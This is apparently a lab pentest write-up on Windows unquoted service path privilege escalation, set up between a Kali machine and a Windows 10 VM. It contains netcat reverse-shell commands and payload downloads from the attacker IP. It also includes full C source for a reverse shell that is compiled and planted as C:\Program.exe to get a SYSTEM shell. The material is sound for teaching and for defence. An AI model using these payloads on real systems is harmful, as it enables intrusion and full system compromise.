<h1 align="center"> Unquote Service Path </h1>

<img width="1024" height="600" alt="Unquoted Service Path" src="https://github.com/user-attachments/assets/bbebe756-77a2-4738-879e-bcf6cc3286fd" />



---

## Scope:
- **Attacker**: Kali Linux (IP `192.168.127.128`)
- **Victim**: windows 10 (IP `192.168.127.148`)



---

## Table of contents
[Introduction to Unquote Service Path](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/10.%20Unquoted_Service_Path.md#introduction-to-unquote-service-path)
  [What is Unquoted Service Path?](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/10.%20Unquoted_Service_Path.md#what-is-unquoted-service-path)
  [How Windows Interprets Service Paths](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/10.%20Unquoted_Service_Path.md#how-windows-interprets-service-paths)

[Setup Lab](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/10.%20Unquoted_Service_Path.md#setup-lab)
  1. [Create the vulnerable service](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/10.%20Unquoted_Service_Path.md#1-create-the-vulnerable-service)
  2. [Transfer Netcat & Get Shell from Victim to Kali](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/10.%20Unquoted_Service_Path.md#2-transfer-netcat--get-shell-from-victim-to-kali)

[Windows Unquote Service Path Methodology](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/10.%20Unquoted_Service_Path.md#windows-unquote-service-path-methodology)
  1. [Enumeration Processes](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/10.%20Unquoted_Service_Path.md#1-enumeration-processes)
     1. [Manual Enumeration](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/10.%20Unquoted_Service_Path.md#1-manual-enumeration)
     2. [Check Permissions](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/10.%20Unquoted_Service_Path.md#2-check-permissions)
     3. [Identify Vulnerable Services](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/10.%20Unquoted_Service_Path.md#3-identify-vulnerable-services)
  2. [EXPLOITATION METHODS](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/10.%20Unquoted_Service_Path.md#2-exploitation-methods)
     1. [Manual Exploitation](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/10.%20Unquoted_Service_Path.md#1-manual-exploitation)
     2. [Create Malicious Executable](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/10.%20Unquoted_Service_Path.md#2-create-malicious-executable)



---


# Introduction to Unquote Service Path


## What is Unquoted Service Path?
An unquoted service path vulnerability occurs when a Windows service is configured with an executable path that:
- Contains spaces
- Is **NOT** enclosed in quotes
- Has spaces in the directory structure


## How Windows Interprets Service Paths

When Windows starts a service with an unquoted path, it searches for the executable in this order:

- **Example Path**: `C:\Program Files\Vulnerable App\service.exe`

- Windows searches sequentially:
  - `C:\Program.exe`
  - `C:\Program Files\Vulnerable.exe`
  - `C:\Program Files\Vulnerable App\service.exe`

### Why This is Dangerous
- Attackers can place malicious executables in earlier paths
- No special privileges required for writing to some directories
- Service often runs with SYSTEM privileges



---




# Setup Lab

## 1. Create the vulnerable service
First press `Ctrl + S` -> type `cmd` -> choose `Run as Administrator`:
<img width="782" height="677" alt="image" src="https://github.com/user-attachments/assets/5e97b129-26e0-4b45-8128-3f6a279f1a56" />


### Create directories and a dummy binary
````
mkdir "C:\Program Files\Vuln Service"
copy C:\Windows\System32\notepad.exe "C:\Program Files\Vuln Service\service.exe"
````
<img width="1027" height="500" alt="image" src="https://github.com/user-attachments/assets/d8909eb2-43ce-47f6-9f9a-22019fb4edf9" />


### Create the service with an unquoted path
````
sc create VulnService binPath= "C:\Program Files\Vuln Service\service.exe" start= auto DisplayName= "Vulnerable Service"
sc description VulnService "Demo service with unquoted path"
````
- Check:
````
sc query VulnService
````
<img width="1306" height="325" alt="image" src="https://github.com/user-attachments/assets/946dd06e-2111-40fc-8ddb-bfdc8dd5b7a3" />

````
sc qc VulnService
````
<img width="693" height="290" alt="image" src="https://github.com/user-attachments/assets/6d9db129-04c7-47ae-a205-90a9a2d45a94" />


- Now we got successful.



## 2. Transfer Netcat & Get Shell from Victim to Kali:

Use a simple HTTP server to host the binary:

### On attacker (Kali)

- On kali find folder that have `nc.exe`:
````
which nc
````
<img width="266" height="87" alt="image" src="https://github.com/user-attachments/assets/575922ff-6b93-422a-a0f6-b7a02bf8d133" />

- Now we see it stay in `/usr/bin/nc`.

- Or to see detail:
````
whereis nc
````
<img width="497" height="106" alt="image" src="https://github.com/user-attachments/assets/3d9638fc-9387-41ea-a8bd-e6657059633d" />


- Check on kali we have nc.exe or not?
````
find / -iname "nc.exe" 2>/dev/null
````
<img width="523" height="96" alt="image" src="https://github.com/user-attachments/assets/4a7ba6aa-b304-4ac8-bfbb-63039692a13a" />


#### Copy nc.exe to a working folder
````
mkdir -p ~/tools
cp /usr/share/windows-resources/binaries/nc.exe ~/tools
cd ~/tools
ls
````
<img width="630" height="335" alt="image" src="https://github.com/user-attachments/assets/794bc47e-8636-4d32-b6b2-2696dcd8b2fc" />





#### Serve the file from Kali
````
python3 -m http.server 8000
````
<img width="670" height="188" alt="image" src="https://github.com/user-attachments/assets/9c2b6050-6048-4c70-bb07-5e3ed3e61ff3" />



### On Windows:
On the Windows target, we can pull the file down with built‑in tools:
````
curl http://192.168.127.128:8000/nc.exe -o nc.exe
````
<img width="983" height="737" alt="image" src="https://github.com/user-attachments/assets/47366a5c-efe4-4e0c-924d-9fcb437aa57a" />



### Start Listen

#### On kali
````
nc -lvnp 4444
````
<img width="376" height="127" alt="image" src="https://github.com/user-attachments/assets/35d00eba-0f03-4416-a15b-b58aa17e9804" />



#### On windows:
````
.\nc.exe 192.168.127.128 4444 -e cmd.exe
````
<img width="804" height="132" alt="image" src="https://github.com/user-attachments/assets/881d2a36-e6f6-46e2-8a56-39892d75adaf" />

- After back to our attacker:
<img width="772" height="282" alt="image" src="https://github.com/user-attachments/assets/5752546c-487b-41bb-9e4e-af62e661b439" />


- Now we succeed to get shell.



### Get target Powershell with netcat :
#### On kali (Attacker)
````
nc -lvnp 4444
````
<img width="363" height="159" alt="image" src="https://github.com/user-attachments/assets/c245dd4f-50dd-4975-9ffd-848e24b5c9c4" />


#### On Victim:
````
.\nc.exe 192.168.127.128 -e powershell.exe
````
- In this sometime we can use it, and sometime we can't use it like this:
<img width="809" height="66" alt="image" src="https://github.com/user-attachments/assets/956328fe-558d-4485-9d63-9c94e9d03fe7" />


````
.\nc.exe 192.168.127.128 4444 -e powershell.exe
````
<img width="849" height="162" alt="image" src="https://github.com/user-attachments/assets/08697d9d-c24c-41ae-b94d-384d5ac7071a" />
 
> Note: 192.168.127.128 is my attacker IP.

- After back to our attacker (kali):
<img width="675" height="763" alt="image" src="https://github.com/user-attachments/assets/8712bb33-d722-40e0-8939-4e3d2cb2bcff" />

- Now we got target `Powershell`, and use command like ``PowerShell`` on windows.



---





# Windows Unquote Service Path Methodology

## 1. Enumeration Processes 

### 1. Manual Enumeration

#### Using SC (Service Control)

##### List all services with their binary paths
````
sc query state= all | findstr SERVICE_NAME
````
<img width="717" height="818" alt="image" src="https://github.com/user-attachments/assets/b57ac63f-1ce3-4c80-98bd-fc4fdf2caa9f" />



````
sc qc "VulnService"
````
<img width="732" height="302" alt="image" src="https://github.com/user-attachments/assets/78b5d926-9aff-4d9a-aa5e-5006445be1f6" />

- `VulnServer`: is our Nmae Service that we was create on above.



#### Find unquoted paths
````
for /f "tokens=2 delims=:" %i in ('sc query state= all ^| findstr SERVICE_NAME') do @sc qc %i | findstr BINARY_PATH_NAME
````



#### Using WMIC
````
wmic service get name,pathname | findstr /i /v "C:\Windows" | findstr /i """"
````
<img width="1698" height="449" alt="image" src="https://github.com/user-attachments/assets/71c9ca6b-5047-426a-a027-689c978e074c" />


- `wmic service get name,pathname`: Lists all Windows services, showing:
  - `Name` → the internal service name.
  - `PathName` → the executable file the service runs.
- `| findstr /i /v "C:\Windows"`: Filters out any services whose executable path is inside C:\Windows.
This removes most built‑in system services, leaving mainly third‑party or vendor services.
- `| findstr /i """"`: Filters to only show entries that contain quotes (").
Most service paths are quoted, so this ensures you’re seeing valid executable paths.
- This command is used to list all non‑Windows services and their executable paths, so you can analyze which services might be risky or exploitable.


#### Using PowerShell

##### Find services with unquoted paths
````
Get-WmiObject win32_service | Where-Object {$_.PathName -notlike '"*"'} | Select-Object Name,PathName
````
<img width="1162" height="776" alt="image" src="https://github.com/user-attachments/assets/427fae15-afda-4e7e-8090-42c2344feed6" />


##### Detailed check
````
Get-WmiObject win32_service | ForEach-Object {
    if ($_.PathName -notmatch '^"') {
        if ($_.PathName -match '.* .*') {
            [PSCustomObject]@{
                Name = $_.Name
                Path = $_.PathName
                StartName = $_.StartName
            }
        }
    }
}
````
<img width="1260" height="783" alt="image" src="https://github.com/user-attachments/assets/8f290187-2978-495f-bb31-bd2d6b777c53" />

- In this we can create file `.ps1`:

- Use notepad:
````
notepad UnquotedServices.ps1
````
<img width="543" height="79" alt="image" src="https://github.com/user-attachments/assets/af2650ca-9acc-42a5-800f-c988febc13e9" />

- In this we can't use direct notepad on kali, after go back to windows -> And we see this:
<img width="1085" height="738" alt="image" src="https://github.com/user-attachments/assets/01891bf9-2be3-437b-866a-80f45ff5ca6c" />

- Press `Ctrl + S` to save it:
<img width="468" height="288" alt="image" src="https://github.com/user-attachments/assets/40e35f48-009b-4d0c-8a27-1d3d8be21eb3" />

- After check it:
<img width="712" height="653" alt="image" src="https://github.com/user-attachments/assets/94c3a1b9-6a6a-4bec-a9c4-e3ed688aeb74" />

- Execute it:
````
./UnquotedServices.ps1
````
<img width="1278" height="784" alt="image" src="https://github.com/user-attachments/assets/2cc41296-ecd3-47da-9cfd-5bbb865f6a34" />

This script is used to find vulnerable services where:
- The binary path contains spaces.
- The path is not properly quoted.
- The service runs under a privileged account.


#### Use script with specific service
````
Get-WmiObject win32_service -Filter "Name='VulnService'" | ForEach-Object {
    if ($_.PathName -notmatch '^"') {
        if ($_.PathName -match '.* .*') {
            [PSCustomObject]@{
                Name      = $_.Name
                Path      = $_.PathName
                StartName = $_.StartName
            }
        }
    }
}
````
<img width="947" height="550" alt="image" src="https://github.com/user-attachments/assets/fc86cd17-362c-453a-b478-445480faf18f" />

- Now we found the vulnerable of this service:
- **Unquoted path with spaces**: The path contains spaces (Program Files) but is not wrapped in quotes.
- **Privilege level**: Runs as LocalSystem, the most privileged account on Windows.
- **Auto start**: Service launches automatically, increasing exposure.
- **Attack vector**: Windows parses the path left‑to‑right. An attacker could place a malicious file like `C:\Program.exe` or `C:\Program Files\Vuln_Service.exe`. When the service starts, Windows may execute the attacker’s file instead of the intended binary — with SYSTEM privileges.




### 2. Check Permissions

#### Using AccessChk.exe (Sysinternals)

##### Check writable directories


##### Check writable directories
````
accesschk64.exe -wvu "C:\Program Files"
````
<img width="687" height="800" alt="image" src="https://github.com/user-attachments/assets/37e40442-6b8d-4c31-ab46-288e75f70644" />

- `accesschk64.exe`: Sysinternals tool by Mark Russinovich. It reports effective permissions on `files`, `folders`, `registry keys`, ``services``, etc.
- ``-w``: Show write access permissions.
- `-v`: Verbose output (detailed listing of rights).
- `-u`: Show permissions by user/group.
- This command is used to check effective write permissions on `C:\Program Files`, showing which accounts or groups can create, modify, or delete files there.

````
accesschk64.exe -wvu "C:\Program Files (x86)"
````
<img width="675" height="797" alt="image" src="https://github.com/user-attachments/assets/d4e799fd-6c32-4044-921f-0c144809ceef" />

> Note: accesschk64.exe we use it on CMD.



#### Using icacls (Built-in)
````
icacls "C:\Program Files\Vuln_Service"
````
<img width="1025" height="356" alt="image" src="https://github.com/user-attachments/assets/c38b8fb0-002b-4acf-b356-2b5cb32cc8a9" />





### 3. Identify Vulnerable Services

#### Complete Enumeration Script:
````
$services = Get-WmiObject Win32_Service | Where-Object {
    $_.PathName -ne $null -and 
    $_.PathName -notlike '"*"' -and 
    $_.PathName -match '^[a-zA-Z]:\\.*\\.*\s+.*'
}

foreach ($service in $services) {
    $path = $service.PathName
    
    # Extract binary path (remove arguments)
    if ($path -match '^([a-zA-Z]:\\.*?\.exe)') {
        $binaryPath = $matches[1]
        $dirPath = Split-Path $binaryPath -Parent
        
        # Check if directory exists
        if (Test-Path $dirPath) {
            $acl = Get-Acl $dirPath
            $writable = $acl.Access | Where-Object {
                $_.FileSystemRights -match "Write|FullControl" -and
                $_.IdentityReference -notmatch "SYSTEM|Administrators"
            }
            
            if ($writable) {
                Write-Host "[!] Vulnerable Service Found!" -ForegroundColor Red
                Write-Host "    Name: $($service.Name)"
                Write-Host "    Path: $path"
                Write-Host "    Directory: $dirPath"
                Write-Host "    Writable by: $($writable.IdentityReference)"
                Write-Host ""
            }
        }
    }
}
````
<img width="1063" height="819" alt="image" src="https://github.com/user-attachments/assets/3ab487a3-eed3-4c5e-87ad-124f3ebeebac" />

<img width="982" height="846" alt="image" src="https://github.com/user-attachments/assets/50c55070-775c-4cd1-98aa-c0c520159a00" />

- Now we see the vulnerable of service.


##### Or in this I create file powershell:
````
notepad Vuln_Services.ps1
````
<img width="497" height="83" alt="image" src="https://github.com/user-attachments/assets/68ca579d-d9bc-44b2-a0a6-733405000b19" />

- Back to windows:
<img width="1082" height="742" alt="image" src="https://github.com/user-attachments/assets/5ac7b00b-d751-4e3c-922a-acc09e2f5487" />

- Press `Ctrl + S` to save it.

- After go back to our attacker:
<img width="703" height="631" alt="image" src="https://github.com/user-attachments/assets/f5b2d457-41d6-43ea-9b74-ff1c9a42ee97" />

- Execute it:
````
.\Vuln_Services.ps1
````
<img width="776" height="817" alt="image" src="https://github.com/user-attachments/assets/d6471e51-f8f0-451b-9dc1-7fd11b00d6eb" />

---




## 2. EXPLOITATION METHODS

### 1. Manual Exploitation

#### Finds services with unquoted paths containing spaces
- In this I used direct on windos:
````
notepad Check-UnquotedServices.ps1
````
````
$services = Get-WmiObject win32_service | Where-Object {
    $_.PathName -notmatch '^"' -and $_.PathName -match '.* .*'
}

foreach ($svc in $services) {
    Write-Host "Service: $($svc.Name)"
    Write-Host "Path   : $($svc.PathName)"
    Write-Host "Account: $($svc.StartName)"
    Write-Host "-----------------------------------"

    # Extract folder path
    $exePath = $svc.PathName.Split(" ")[0]   # first token
    $folder  = Split-Path $exePath -Parent

    Write-Host "Checking ACLs for: $folder"
    try {
        icacls $folder
    } catch {
        Write-Host "Could not read ACLs for $folder"
    }

    Write-Host "`n"
}
````
<img width="1049" height="564" alt="image" src="https://github.com/user-attachments/assets/264433d9-e4f7-471a-a057-7a17bda23584" />



- Execute it:
````
.\Check-UnquotedServices.ps1
````
<img width="1144" height="851" alt="image" src="https://github.com/user-attachments/assets/01fd1d82-c2dd-4c43-a531-63481b2d8af4" />

- This command will output:
  - Services listed are vulnerable (unquoted + spaces).
  - ACLs show who can write to the folder.







### 2. Create Malicious Executable
- On attacker:
````
mousepad unquote_exploit.c
````
````
// unquote_exploit.c
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "ws2_32")

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in addr;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    // Create socket
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) {
        return 1;
    }

    // Configure target address
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("192.168.127.128");  // CHANGE THIS TO YOUR KALI IP!
    addr.sin_port = htons(4444);

    // Connect back to attacker
    if (WSAConnect(sock, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) != 0) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Prepare process startup info
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    // Spawn cmd.exe with redirected I/O
    if (!CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Wait for process to finish (optional)
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Cleanup
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
    WSACleanup();

    return 0;
}
````
<img width="792" height="741" alt="image" src="https://github.com/user-attachments/assets/2195eea2-d6c1-4660-b3fa-457ad855fe54" />


#### Compile
````
x86_64-w64-mingw32-gcc unquote_exploit.c -o unquote_exploit.exe -lws2_32
````
<img width="798" height="163" alt="image" src="https://github.com/user-attachments/assets/2621e2ca-8094-4289-8919-087274ce1565" />



#### Transfer
- On kali
````
python3 -m http.server 8000
````
<img width="677" height="120" alt="image" src="https://github.com/user-attachments/assets/550d6ce4-cbae-4fbc-93af-51cfdd5399c8" />


- On windows:
````
curl http://192.168.127.128:8000/unquote_exploit.exe -o unquote_exploit.exe
````
<img width="840" height="90" alt="image" src="https://github.com/user-attachments/assets/0a0e889d-0480-40b9-a810-72be3fc8201f" />

<img width="547" height="164" alt="image" src="https://github.com/user-attachments/assets/8282f9d4-11a2-47b8-9fc9-8f35b31950d2" />


- Check:
````
Get-WmiObject Win32_Service | Where-Object { $_.PathName -notlike 'C:\Windows*' -and $_.PathName -notmatch '^"' -and $_.PathName -like "* *" } | Select-Object Name, PathName, StartMode
````
<img width="1894" height="228" alt="image" src="https://github.com/user-attachments/assets/610469f6-0c33-417d-9bb9-8fb53d69b3fc" />

- Confirm the service runs as SYSTEM
````
(Get-WmiObject Win32_Service -Filter "Name='VulnService'").StartName
````
<img width="1036" height="123" alt="image" src="https://github.com/user-attachments/assets/9b57e477-bbaf-47a7-9460-cc122efec867" />




````
nc -lvnp 4444
````
<img width="404" height="160" alt="image" src="https://github.com/user-attachments/assets/92843823-8fd4-4fb8-b92d-e72c14f38699" />

````
sc.exe start VulnService
````
<img width="547" height="187" alt="image" src="https://github.com/user-attachments/assets/cb57b8a7-13cb-454a-889c-f0a54f1b6a2b" />

- But in this I failed, but in this some service maybe work.


#### Fix it:

##### If not, rename our compiled payload:
````
mv unquote_exploit.exe Program.exe
ls -la Program.exe
````
<img width="433" height="64" alt="image" src="https://github.com/user-attachments/assets/6a43dde9-c404-4940-a4e1-5a1ff9bbcf38" />

- Check:
````
ls -la Program.exe
cat Program.exe
````
<img width="1915" height="821" alt="image" src="https://github.com/user-attachments/assets/47b9852d-dd8c-4e4e-b99a-7d6138b7fdfb" />



- After on attacker (kali)
````
sudo python3 -m http.server 80
````
<img width="832" height="164" alt="image" src="https://github.com/user-attachments/assets/205c9fe4-ba86-4c29-b389-fad0854a6121" />



##### Download payload
````
Invoke-WebRequest -Uri "http://192.168.127/Program.exe" -OutFile "C:\Program.exe"
dir C:\Program.exe
````
<img width="1237" height="278" alt="image" src="https://github.com/user-attachments/assets/87c54fe2-92df-4295-9667-fa37f3c1c732" />



- After back to attacker.

##### On attacker:
````
nc -lvnp 4444
````
<img width="314" height="137" alt="image" src="https://github.com/user-attachments/assets/4fed16ce-4e5f-45a0-909a-59b581c5227d" />

- After on target.

##### Start the service
````
sc.exe start VulnService
````
<img width="760" height="179" alt="image" src="https://github.com/user-attachments/assets/33c152ec-a1f4-468c-9145-8d36af1150c3" />

- Now we got success. After back to our **Attacker**:
<img width="804" height="290" alt="image" src="https://github.com/user-attachments/assets/5cf65764-7437-4058-8eaa-788336007ae5" />

- Now we got target `shell`. But on victimit will show this:
<img width="955" height="127" alt="image" src="https://github.com/user-attachments/assets/b4bf7df5-2478-4a90-8cf5-f6492f4c37bf" />

We got the `shell` because the service failed with error 1053. The reverse shell executed successfully before the service timeout — so the exploit worked despite (and partly because of) the error.


##### Also we can start service on attack and listen on attacker:

- In this on attacker I start Listen:
<img width="427" height="193" alt="image" src="https://github.com/user-attachments/assets/3ace13ea-b344-45d6-8f61-e8969330a1eb" />

- But on attacker `Terminal` that i got first shell -> I start the service and what happen:
<img width="503" height="133" alt="image" src="https://github.com/user-attachments/assets/eb8de8f9-86ad-4551-a5d5-b9d11e64a336" />

- `Boom` after go back to `Listener Terminal`:
<img width="858" height="287" alt="image" src="https://github.com/user-attachments/assets/37e3d0d2-ef94-4812-a995-75c998ccc9db" />

- **Boom** now we got shell like first Terminal.


----

<h2 align="center"> Completed - Unquoted Service Path </h2>


<h2 align="center"> 
  &copy; 2026 Nin Kanong (<a href="https://github.com/Nin-Kanong/pentest-writeups">@k4n0ng</a>). All rights reserved.
</h2>
